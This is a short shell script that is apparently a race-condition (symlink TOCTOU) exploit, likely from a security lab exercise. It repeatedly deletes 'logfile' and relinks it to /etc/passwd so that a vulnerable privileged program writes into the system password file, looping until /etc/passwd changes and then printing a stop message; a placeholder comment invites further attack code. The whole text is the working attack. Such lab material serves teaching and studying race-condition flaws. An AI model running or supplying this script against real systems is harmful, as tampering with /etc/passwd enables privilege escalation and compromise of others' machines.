#!/bin/sh

old=`ls -l /etc/passwd`
new=`ls -l /etc/passwd`

while [ "$old" = "$new" ]

do
	# <your attack code here>
	rm -f logfile
	ln -sf /etc/passwd logfile
	new=`ls -l /etc/passwd`
done
unlink logfile
touch logfile
echo STOP... The passwd file has been changed
